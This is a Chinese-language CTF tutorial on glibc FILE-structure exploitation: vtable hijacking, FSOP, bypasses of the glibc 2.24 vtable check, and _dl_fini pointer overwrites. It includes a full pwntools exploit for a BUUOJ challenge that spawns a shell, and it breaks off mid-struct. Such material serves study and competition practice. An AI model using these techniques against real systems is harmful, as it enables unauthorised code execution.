\u76f4\u63a5\u6539\u5199 vtable \u4e2d\u7684\u865a\u51fd\u6570\u6307\u9488 \u8986\u76d6 vtable \u7684\u6307\u9488\uff08\u4f2a\u9020 vtabel\uff09 libc2.23 \u7248\u672c\u4e0b\uff0c\u4f4d\u4e8e libc \u6570\u636e\u6bb5\u7684 vtable \u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165 vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684 _IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u53ef\u4ee5\u5c06 sh \u6216\u5176\u4ed6\u53c2\u6570\u5199\u5165 _IO_FILE_plus \u5934\u90e8 \u4f8b\u9898 \u00b6 2018 HCTF the_end \u00b6 \u9898\u76ee\u94fe\u63a5 \u901a\u8fc7\u4f2a\u9020 vtabel \u5b9e\u73b0\u8fd0\u884c\u7279\u5b9a\u51fd\u6570\uff08\u4fee\u6539\u865a\u51fd\u6570\u7684 overflow \u6307\u9488\uff09 \u5176\u4ed6\u505a\u6cd5\uff1a https://blog.csdn.net/Mira_Hu/article/details/103736917 \u57fa\u672c\u60c5\u51b5 \u00b6 \u9664\u4e86 canary \u4fdd\u62a4\u5168\u5f00\uff0c\u4efb\u610f\u5730\u5740\u5199 5 \u5b57\u8282 \u601d\u8def \u00b6 \u5728\u7a0b\u5e8f\u8c03\u7528 exit \u540e\uff0c\u4f1a\u904d\u5386 IO_list_all \uff0c\u8c03\u7528 _IO_2_1_stdout \u4e0b\u7684 vatable \u4e2d _setbuf \u51fd\u6570\u3002\u5148\u4fee\u6539\u4e24\u4e2a\u5b57\u8282\u5728\u5f53\u524d vtable \u9644\u8fd1\u4f2a\u9020\u4e00\u4e2a fake_vtable \uff0c\u7136\u540e\u4f7f\u7528 3 \u4e2a\u5b57\u8282\u4fee\u6539 fake_vtable \u4e2d _setbuf \u7684\u5185\u5bb9\u4e3a one_gadget \u3002 FSOP \u00b6 \u4ecb\u7ecd \u00b6 \u8fdb\u7a0b\u5185\u6240\u6709\u7684 _IO_FILE \u7ed3\u6784\u4f1a\u4f7f\u7528 _chain \u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531 _IO_list_all \u7ef4\u62a4\u3002 FSOP \u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301 _IO_list_all \u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684 _IO_FILE \u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP \u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528 _IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0 _IO_list_all \u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2a FILE \u8c03\u7528 fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528 _IO_FILE_plus.vtable \u4e2d\u7684 _IO_overflow\u3002 int _IO_flush_all_lockp ( int do_lock ) { ... fp = ( _IO_FILE * ) _IO_list_all ; while ( fp != NULL ) { ... if ((( fp -> _mode <= 0 && fp -> _IO_write_ptr > fp -> _IO_write_base )) && _IO_OVERFLOW ( fp , EOF ) == EOF ) { result = EOF ; } ... } } \u800c _IO_flush_all_lockp \u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a \u5f53 libc \u6267\u884c abort \u6d41\u7a0b\u65f6 \u5f53\u6267\u884c exit \u51fd\u6570\u65f6 \u5f53\u6267\u884c\u6d41\u4ece main \u51fd\u6570\u8fd4\u56de\u65f6 \u539f\u7406\u793a\u4f8b \u00b6 FSOP \u5229\u7528\u7684\u6761\u4ef6\uff1a\u6cc4\u9732 libc.so \u57fa\u5740\uff0c\u56e0\u4e3a _IO_list_all \u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728 libc.so \u4e2d\u7684\uff1b\u7528\u4efb\u610f\u5730\u5740\u5199\u628a _IO_list_all \u6539\u4e3a\u6307\u5411\u53ef\u63a7\u5185\u5b58\u7684\u5730\u5740\uff1b\u4f2a\u9020 _IO_FILE_plus \u7ed3\u6784\u4f53\u3002\u4f2a\u9020\u7ed3\u6784\u4f53\u9700\u8981 bypass \u8fd9\u4e9b check \uff1a if ((( fp -> _mode <= 0 && fp -> _IO_write_ptr > fp -> _IO_write_base )) && _IO_OVERFLOW ( fp , EOF ) == EOF ) { result = EOF ; } \u4e5f\u5c31\u662f fp->_mode <= 0 fp->_IO_write_ptr > fp->_IO_write_base \u5199\u4e00\u4e2a demo \u9a8c\u8bc1\u4e00\u4e0b\uff1a\u9996\u5148\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020 _IO_FILE_plus\uff08_IO_FILE\u3001vtable)\u3002_IO_write_ptr\u3001_IO_write_base\u3001_mode \u7b49\u6570\u636e\u504f\u79fb\u5982\u4e0b\uff08\u53ef\u4ee5\u901a\u8fc7\u67e5\u524d\u9762\u7ed9\u51fa\u7ed3\u6784\u4f53\u7b97\u51fa\u6765\uff09\uff1a #define _IO_list_all 0x7ffff7dd2520 #define writebase_offset 0x20 #define writeptr_offset 0x28 #define mode_offset 0xc0 #define vtable_offset 0xd8 int main ( void ) { void * ptr ; long long * list_all_ptr ; ptr = malloc ( 0x200 ); //bypass * ( long long * )(( long long ) ptr + mode_offset ) = 0x0 ; * ( long long * )(( long long ) ptr + writeptr_offset ) = 0x1 ; * ( long long * )(( long long ) ptr + writebase_offset ) = 0x0 ; * ( long long * )(( long long ) ptr + vtable_offset ) = (( long long ) ptr + 0x100 ); //vtable _IO_overflow * ( long long * )(( long long ) ptr + 0x100 + 24 ) = 0x41414141 ; //orw _IO_list_all _chain 2 fake _IO_FILE_plus list_all_ptr = ( long long * ) _IO_list_all ; list_all_ptr [ 0 ] = ptr ; exit ( 0 ); } \u524d 0x100 \u4e2a\u5b57\u8282\u4f5c\u4e3a _IO_FILE \uff0c\u540e 0x100 \u4e2a\u5b57\u8282\u4f5c\u4e3a vtable \uff0c\u5728 vtable _IO_overflow \u6307\u9488\u52ab\u6301\u4e3a 0x41414141 \u3002 \u4e4b\u540e\uff0c\u8986\u76d6 libc \u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all \u6307\u5411\u4f2a\u9020\u7684 _IO_FILE_plus \u3002 \u5168\u5c40\u53d8\u91cf _IO_list_all \u5b58\u50a8\u7740\u7ed3\u6784\u4f53 _IO_FILE_plus \u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u4e5f\u662f _IO_FILE \u6240\u5728\u5730\u5740\uff0c\u540e\u9762\u662f vtable \u901a\u8fc7\u8c03\u7528 exit \u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7 fflush 1 \u83b7\u53d6 _IO_list_all \u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a _IO_FILE_plus **\u8c03\u7528\u5176\u4e2d\u7684 _IO_overflow \u51fd\u6570**\u5b9e\u73b0\u529f\u80fd\uff1a ---> call _IO_overflow [#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0) [#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup() [#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1) [#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=<optimized out>) [#4] 0x4005ce \u2192 Name: main() \u4f8b\u9898 \u00b6 ciscn_2019_n_7 \u00b6 \u5927\u4f53\u662f\u7528 FSOP \u601d\u8def\uff0c\u4e0d\u662f\u52ab\u6301 _IO_list_all _chain \u6307\u9488\u4f2a\u9020\u4e00\u4e2a\u7ed3\u6784\u4f53\uff1b\u800c\u76f4\u63a5\u4fee\u6539 _IO_FILE_plus \u57fa\u672c\u60c5\u51b5 \u00b6 \u4fdd\u62a4\u5168\u5f00\uff0c\u7528\u7684\u662f buu \u7684\u8fdc\u7a0b\u73af\u5883\u5bf9\u5e94\u662f Ubuntu 16 libc 2.23\uff1a Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enable \u7a0b\u5e8f\u53ea\u80fd\u6709\u4e00\u4e2a\u5806\uff0c\u7528\u7ed3\u6784\u4f53\u7ef4\u62a4\uff0c\u7ed3\u6784\u5982\u4e0b\uff1a struct { size ; //8bit data ; //8bit chunk_addr ; //8bit } \u6f0f\u6d1e \u00b6 \u5728 add \u65f6\u5199\u5165 author \u65f6\u6ea2\u51fa 8 bit \u521a\u597d\u53ef\u4ee5\u8986\u76d6\u5806\u6307\u9488\uff1a \u7ed3\u5408 edit \u53ef\u4ee5\u591a\u6b21\u4fee\u6539\u5806\u6307\u9488\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u591a\u6b21\u5199\u5165\uff1a \u601d\u8def \u00b6 myexit \u51fd\u6570\u6709\u5173\u95ed stdout\u3001stderr \u540e\u6267\u884c exit() \uff0cexit() \u65f6\u7cfb\u7edf\u4f1a\u8c03\u7528 _IO_flush_all_lockp \u3002\u4fee\u6539\u5806\u6307\u9488\u5230 _IO_2_1_stderr_ \uff0c\u5e03\u7f6e\u7ed5\u8fc7\u7ed5\u8fc7\u9700\u8981\u7684\u6570\u636e\uff1b\u5728\u9002\u5f53\u4f4d\u7f6e\u5199\u5165 system \uff0c\u5c06 vtable \u52ab\u6301\u5230\u8fd9\u4e2a\u7a7a\u95f4\u4e0a\uff0c\u5b8c\u6210\u52ab\u6301 _IO_flush_all_lockp \u4e3a system \u3002\u5199\u5165 _IO_2_1_stderr_ \u65f6\u5c06 /bin/sh \u5199\u5230 _IO_FILE \u7684\u5934\u90e8\uff0c\u8c03\u7528\u865a\u51fd\u6570\u65f6 _IO_FILE \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002 \u56e0\u4e3a vtable \u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684 _IO_FILE_plus \u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a \"sh\" \u5199\u5165 _IO_FILE_plus \u5934\u90e8\u3002 \u8c03\u8bd5\u67e5\u770b\u7ed3\u6784\u4f53 \uff1a p * (( struct [ \u7ed3\u6784\u4f53\u7c7b\u578b ] * )[ \u5730\u5740 ]) EXP \u00b6 from pwn import * context ( log_level = 'debug' ) #,terminal=['tmux','sp','-h']) #p = process(\"./ciscn_2019_n_7\") p = remote ( \"node3.buuoj.cn\" , 28957 ) #libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") libc = ELF ( './libc-2.23.so' ) elf = ELF ( \"./ciscn_2019_n_7\" ) def command ( id ): p . recvuntil ( \"-> \\n \" ) p . sendline ( str ( id )) def edit ( name , content ): command ( 2 ) p . recvuntil ( \"New Author name: \\n \" ) p . sendline ( name ) p . recvuntil ( \"New contents: \\n \" ) p . send ( content ) command ( 666 ) puts_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"puts_addr:\" + hex ( puts_addr )) libc_base = puts_addr - libc . sym [ 'puts' ] log . info ( \"libc_base:\" + hex ( libc_base )) # IO_list_all=libc_base+libc.sym['_IO_list_all'] # log.info(\"IO_list_all:\"+hex(IO_list_all)) IO_2_1_stderr = libc . sym [ '_IO_2_1_stderr_' ] + libc_base log . info ( \"IO_2_1_stderr:\" + hex ( IO_2_1_stderr )) system = libc_base + libc . sym [ 'system' ] log . info ( \"system:\" + hex ( system )) command ( 1 ) p . recvuntil ( \": \\n \" ) p . sendline ( str ( 0xf8 )) p . recvuntil ( \": \\n \" ) payload = 'a' * 8 + p64 ( IO_2_1_stderr ) p . send ( payload ) #gdb.attach(p,\"b *$rebase(0xb02)\") #define writebase_offset 0x20 ->0 #define writeptr_offset 0x28 ->1 #define mode_offset 0xc0 ->0 #define vtable_offset 0xd8 ->system&onegadget payload = '/bin/sh \\x00 ' . ljust ( 0x20 , ' \\x00 ' ) + p64 ( 0 ) + p64 ( 1 ) #0x30 payload += p64 ( 0 ) * 4 + p64 ( system ) * 4 #p64(libc_base+0x4526a)*4#0x50-0x70 payload = payload . ljust ( 0xd8 , ' \\x00 ' ) payload += p64 ( IO_2_1_stderr + 0x40 ) edit ( 'a \\n ' , payload ) command ( 4 ) p . sendline ( 'exec 1>&0' ) p . interactive () glibc 2.24 \u5229\u7528 \u00b6 \u65b0\u589e\u9632\u5fa1\u673a\u5236 \u00b6 glibc 2.24 \u540e\u65b0\u589e vtable \u68c0\u67e5\u51fd\u6570\uff1aIO_validate_vtable \u548c _IO_vtable_check \u3002 libio/libioP.h libio/vtables.c vtables \u88ab\u653e\u8fdb\u4e86\u4e13\u7528\u7684\u53ea\u8bfb\u7684 __libc_IO_vtables \u6bb5\uff0cglibc \u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5 vtable \u5730\u5740\u7684\u5408\u6cd5\u6027\u3002\u9996\u5148\u4f1a\u9a8c\u8bc1 vtable \u662f\u5426\u4f4d\u4e8e_IO_vtable \u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528 _IO_vtable_check \u3002 \u5f88\u591a\u5bf9 vtable \u7684\u653b\u51fb\u65b9\u5f0f\u4e0d\u518d\u9002\u7528\uff0c\u601d\u8def\u8f6c\u5411 stream_buffer _IO_str_jumps \u00b6 libc \u4e2d\u4e0d\u4ec5\u4ec5\u53ea\u6709 _IO_file_jumps \u4e00\u4e2a vtable \uff0c\u8fd8\u6709\u4e00\u4e2a\u53eb _IO_str_jumps \u7684 \uff0c\u8fd9\u4e2a vtable \u4e0d\u5728 check \u8303\u56f4\u4e4b\u5185\u3002 \u6bd4\u5982 _IO_str_jumps \uff08\u8be5\u7b26\u53f7\u5728strip\u540e\u4f1a\u4e22\u5931\uff09\uff1a // libio/strops.c const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY , JUMP_INIT ( finish , _IO_str_finish ), JUMP_INIT ( overflow , _IO_str_overflow ), JUMP_INIT ( underflow , _IO_str_underflow ), JUMP_INIT ( uflow , _IO_default_uflow ), JUMP_INIT ( pbackfail , _IO_str_pbackfail ), JUMP_INIT ( xsputn , _IO_default_xsputn ), JUMP_INIT ( xsgetn , _IO_default_xsgetn ), JUMP_INIT ( seekoff , _IO_str_seekoff ), JUMP_INIT ( seekpos , _IO_default_seekpos ), JUMP_INIT ( setbuf , _IO_default_setbuf ), JUMP_INIT ( sync , _IO_default_sync ), JUMP_INIT ( doallocate , _IO_default_doallocate ), JUMP_INIT ( read , _IO_default_read ), JUMP_INIT ( write , _IO_default_write ), JUMP_INIT ( seek , _IO_default_seek ), JUMP_INIT ( close , _IO_default_close ), JUMP_INIT ( stat , _IO_default_stat ), JUMP_INIT ( showmanyc , _IO_default_showmanyc ), JUMP_INIT ( imbue , _IO_default_imbue ) }; // libio/libioP.h #define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0) _IO_str_jumps \u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u53eb\u505a _IO_str_overflow \u7684\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4e2d\u5b58\u5728\u76f8\u5bf9\u5730\u5740\u7684\u5f15\u7528\uff08\u53ef\u4f2a\u9020\uff09\uff1a int _IO_str_overflow ( _IO_FILE * fp , int c ) { int flush_only = c == EOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) return flush_only ? 0 : EOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _IO_write_ptr = fp -> _IO_read_ptr ; fp -> _IO_read_ptr = fp -> _IO_read_end ; } pos = fp -> _IO_write_ptr - fp -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_blen ( fp ) + flush_only )) // \u6761\u4ef6 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base) { if ( fp -> _flags & _IO_USER_BUF ) /* not allowed to enlarge */ return EOF ; else { char * new_buf ; char * old_buf = fp -> _IO_buf_base ; size_t old_blen = _IO_blen ( fp ); _IO_size_t new_size = 2 * old_blen + 100 ; // \u901a\u8fc7\u8ba1\u7b97 new_size \u4e3a \"/bin/sh\\x00\" \u7684\u5730\u5740 if ( new_size < old_blen ) return EOF ; new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740\uff0c\u5373 system(\"/bin/sh\") [...] // libio/strfile.h struct _IO_str_fields { _IO_alloc_type _allocate_buffer ; _IO_free_type _free_buffer ; }; struct _IO_streambuf { struct _IO_FILE _f ; const struct _IO_jump_t * vtable ; }; typedef struct _IO_strfile_ { struct _IO_streambuf _sbf ; struct _IO_str_fields _s ; } _IO_strfile ; \u6240\u4ee5\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff1a fp->_flags = 0 fp->_IO_buf_base = 0 fp->_IO_buf_end = (bin_sh_addr - 100) / 2 fp->_IO_write_ptr = 0xffffffff fp->_IO_write_base = 0 fp->_mode = 0 \u6709\u4e00\u70b9\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c bin_sh_addr \u7684\u5730\u5740\u4ee5\u5947\u6570\u7ed3\u5c3e\uff0c\u4e3a\u4e86\u907f\u514d\u9664\u6cd5\u5411\u4e0b\u53d6\u6574\u7684\u5e72\u6270\uff0c\u53ef\u4ee5\u5c06\u8be5\u5730\u5740\u52a0 1\u3002\u53e6\u5916 system(\"/bin/sh\") \u662f\u53ef\u4ee5\u7528 one_gadget \u6765\u4ee3\u66ff\u7684\uff0c\u8fd9\u6837\u4f3c\u4e4e\u66f4\u52a0\u7b80\u5355\u3002 \u5b8c\u6574\u7684\u8c03\u7528\u8fc7\u7a0b\uff1a malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow \u3002 \u4e0e\u4f20\u7edf\u7684 house-of-orange \u4e0d\u540c\u7684\u662f\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u4e0d\u518d\u9700\u8981\u77e5\u9053 heap \u7684\u5730\u5740\uff0c\u56e0\u4e3a _IO_str_jumps vtable \u662f\u5728 libc \u4e0a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u80fd\u6cc4\u9732\u51fa libc \u7684\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002 \u5728 _IO_str_jumps \u4e2d\uff0c\u8fd8\u6709\u53e6\u4e00\u4e2a\u51fd\u6570 _IO_str_finish \uff0c\u5b83\u7684\u68c0\u67e5\u6761\u4ef6\u6bd4\u8f83\u7b80\u5355\uff1a void _IO_str_finish ( _IO_FILE * fp , int dummy ) { if ( fp -> _IO_buf_base && ! ( fp -> _flags & _IO_USER_BUF )) // \u6761\u4ef6 ((( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( fp -> _IO_buf_base ); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740 fp -> _IO_buf_base = NULL ; _IO_default_finish ( fp , 0 ); } \u53ea\u8981\u5728 fp->_IO_buf_base \u653e\u4e0a \"/bin/sh\" \u7684\u5730\u5740\uff0c\u7136\u540e\u8bbe\u7f6e fp->_flags = 0 \u5c31\u53ef\u4ee5\u4e86\u7ed5\u8fc7\u51fd\u6570\u91cc\u7684\u6761\u4ef6\u3002 \u90a3\u4e48\u600e\u6837\u8ba9\u7a0b\u5e8f\u8fdb\u5165 _IO_str_finish \u6267\u884c\u5462\uff0c fclose(fp) \u662f\u4e00\u6761\u8def\uff0c\u4f46\u4f3c\u4e4e\u6709\u5c40\u9650\u3002\u8fd8\u662f\u56de\u5230\u5f02\u5e38\u5904\u7406\u4e0a\u6765\uff0c\u5728 _IO_flush_all_lockp \u51fd\u6570\u4e2d\u662f\u901a\u8fc7 _IO_OVERFLOW \u6267\u884c\u7684 __GI__IO_str_overflow \uff0c\u800c _IO_OVERFLOW \u662f\u6839\u636e __overflow \u76f8\u5bf9\u4e8e _IO_str_jumps vtable \u7684\u504f\u79fb\u627e\u5230\u5177\u4f53\u51fd\u6570\u7684\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u4f2a\u9020\u4f20\u9012\u7ed9 _IO_OVERFLOW(fp) \u7684 fp \u662f vtable \u7684\u5730\u5740\u51cf\u53bb 0x8\uff0c\u90a3\u4e48\u6839\u636e\u504f\u79fb\uff0c\u7a0b\u5e8f\u5c06\u627e\u5230 _IO_str_finish \u5e76\u6267\u884c\u3002 \u6240\u4ee5\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff1a fp->_mode = 0 fp->_IO_write_ptr = 0xffffffff fp->_IO_write_base = 0 fp->_wide_data->_IO_buf_base = bin_sh_addr \uff08\u4e5f\u5c31\u662f fp->_IO_write_end\uff09 fp->_flags2 = 0 fp->_mode = 0 \u5b8c\u6574\u7684\u8c03\u7528\u8fc7\u7a0b\uff1a malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish \u3002 _IO_wstr_jumps \u00b6 _IO_wstr_jumps \u4e5f\u662f\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684 vtable\uff0c\u603b\u4f53\u4e0a\u548c\u4e0a\u9762\u8bb2\u7684 _IO_str_jumps \u5dee\u4e0d\u591a\uff1a // libio/wstrops.c const struct _IO_jump_t _IO_wstr_jumps libio_vtable = { JUMP_INIT_DUMMY , JUMP_INIT ( finish , _IO_wstr_finish ), JUMP_INIT ( overflow , ( _IO_overflow_t ) _IO_wstr_overflow ), JUMP_INIT ( underflow , ( _IO_underflow_t ) _IO_wstr_underflow ), JUMP_INIT ( uflow , ( _IO_underflow_t ) _IO_wdefault_uflow ), JUMP_INIT ( pbackfail , ( _IO_pbackfail_t ) _IO_wstr_pbackfail ), JUMP_INIT ( xsputn , _IO_wdefault_xsputn ), JUMP_INIT ( xsgetn , _IO_wdefault_xsgetn ), JUMP_INIT ( seekoff , _IO_wstr_seekoff ), JUMP_INIT ( seekpos , _IO_default_seekpos ), JUMP_INIT ( setbuf , _IO_default_setbuf ), JUMP_INIT ( sync , _IO_default_sync ), JUMP_INIT ( doallocate , _IO_wdefault_doallocate ), JUMP_INIT ( read , _IO_default_read ), JUMP_INIT ( write , _IO_default_write ), JUMP_INIT ( seek , _IO_default_seek ), JUMP_INIT ( close , _IO_default_close ), JUMP_INIT ( stat , _IO_default_stat ), JUMP_INIT ( showmanyc , _IO_default_showmanyc ), JUMP_INIT ( imbue , _IO_default_imbue ) }; \u5229\u7528\u51fd\u6570 _IO_wstr_overflow \uff1a _IO_wint_t _IO_wstr_overflow ( _IO_FILE * fp , _IO_wint_t c ) { int flush_only = c == WEOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) return flush_only ? 0 : WEOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _wide_data -> _IO_write_ptr = fp -> _wide_data -> _IO_read_ptr ; fp -> _wide_data -> _IO_read_ptr = fp -> _wide_data -> _IO_read_end ; } pos = fp -> _wide_data -> _IO_write_ptr - fp -> _wide_data -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_wblen ( fp ) + flush_only )) // \u6761\u4ef6 #define _IO_wblen(fp) ((fp)->_wide_data->_IO_buf_end - (fp)->_wide_data->_IO_buf_base) { if ( fp -> _flags2 & _IO_FLAGS2_USER_WBUF ) /* not allowed to enlarge */ return WEOF ; else { wchar_t * new_buf ; wchar_t * old_buf = fp -> _wide_data -> _IO_buf_base ; size_t old_wblen = _IO_wblen ( fp ); _IO_size_t new_size = 2 * old_wblen + 100 ; // \u4f7f new_size * sizeof(wchar_t) \u4e3a \"/bin/sh\" \u7684\u5730\u5740 if ( __glibc_unlikely ( new_size < old_wblen ) || __glibc_unlikely ( new_size > SIZE_MAX / sizeof ( wchar_t ))) return EOF ; new_buf = ( wchar_t * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size * sizeof ( wchar_t )); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740 [...] \u5229\u7528\u51fd\u6570 _IO_wstr_finish \uff1a void _IO_wstr_finish ( _IO_FILE * fp , int dummy ) { if ( fp -> _wide_data -> _IO_buf_base && ! ( fp -> _flags2 & _IO_FLAGS2_USER_WBUF )) // \u6761\u4ef6 ((( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( fp -> _wide_data -> _IO_buf_base ); // \u5728\u8fd9\u4e2a\u76f8\u5bf9\u5730\u5740\u653e\u4e0a system \u7684\u5730\u5740 fp -> _wide_data -> _IO_buf_base = NULL ; _IO_wdefault_finish ( fp , 0 ); } \u4fee\u6539 _dl_fini \u51fd\u6570\u6307\u9488 \u00b6 \u4ee5 hctf2018_the_end \u4e3a\u4f8b\u5b50\uff0c\u9898\u76ee\u90e8\u7f72\u5728 Ubuntu 18\uff0c\u8fdc\u7a0b\u5b9e\u9a8c\u5230 buu \u3002 \u8fd9\u6761\u9898\u76ee\u5728 Ubuntu 18 \u4e0b\u6709 vtable \u68c0\u67e5\uff0c\u4fee\u6539 vtable \u65b9\u6cd5\u5931\u6548\u3002 \u4e0b\u9762\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u5bfb\u627e libc \u4e0e ld \u504f\u79fb\u65f6\u4e0e buu \u9776\u673a\u60c5\u51b5\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u6211\u4eec\u672c\u5730\u5728 docker \u6539 libc \u8fd0\u884c ld \u548c libc \u4f4d\u7f6e\u53d8\u5316\u4e86\uff0c\u5177\u4f53\u770b\u540e\u6587 exit() \u51fd\u6570\u7684\u5229\u7528\u94fe\uff1a \u5728 exit \u51fd\u6570\u4e2d\u4f1a\u8c03\u7528 __run_exit_handlers() \uff1a //glibc/stdlib/exit.c \u2026\u2026 void exit ( int status ) { __run_exit_handlers ( status , & __exit_funcs , true , true ); } \u2026\u2026 __run_exit_handlers() \u8c03\u7528 _dl_fini \uff1a \u5728 _dl_fini \u51fd\u6570\u4e2d\u8c03\u7528\u8c03\u7528\u51fd\u6570 __rtld_lock_lock_recursive() \u548c __rtld_lock_unlock_recursive() \uff1a //glibc/elf/dl-fini.c ... #endif for ( Lmid_t ns = GL ( dl_nns ) - 1 ; ns >= 0 ; -- ns ) { /* Protect against concurrent loads and unloads. */ __rtld_lock_lock_recursive ( GL ( dl_load_lock )); unsigned int nloaded = GL ( dl_ns )[ ns ]. _ns_nloaded ; /* No need to do anything for empty namespaces or those used for auditing DSOs. */ if ( nloaded == 0 #ifdef SHARED || GL ( dl_ns )[ ns ]. _ns_loaded -> l_auditing != do_audit #endif ) __rtld_lock_unlock_recursive ( GL ( dl_load_lock )); else { ... __rtld_lock_lock_recursive \u3001 __rtld_lock_unlock_recursive \u662f\u901a\u8fc7\u5b8f\u5b9a\u4e49\u6765\u7684\uff1a //glibc/sysdeps/nptl/libc-lockP.h # define __rtld_lock_lock_recursive(NAME) \\ GL(dl_rtld_lock_recursive) (&(NAME).mutex) # define __rtld_lock_unlock_recursive(NAME) \\ GL(dl_rtld_unlock_recursive) (&(NAME).mutex) \u4ece\u4e0a\u9762\u5b9a\u4e49\u77e5\u9053\u771f\u6b63\u51fd\u6570\u662f GL \u5b8f\u4e2d\u7684 dl_rtld_lock_recursive \uff0c\u67e5\u770b\u5b8f GL \u5b9a\u4e49\uff1a //Rtld.c extern struct rtld_global _rtld_local __attribute__ (( alias ( \"_rtld_global\" ), visibility ( \"hidden\" ))); //Ldsodefs.h extern struct rtld_global _rtld_local __rtld_local_attribute__ ; # undef __rtld_local_attribute__ # endif extern struct rtld_global _rtld_global __rtld_global_attribute__ ; # undef __rtld_global_attribute__ //Db_info.c typedef struct rtld_global rtld_global ; //elf/Rtld.c struct rtld_global _rtld_global = { /* Generally the default presumption without further information is an * executable stack but this is not true for all platforms. */ . _dl_stack_flags = DEFAULT_STACK_PERMS , #ifdef _LIBC_REENTRANT . _dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER , . 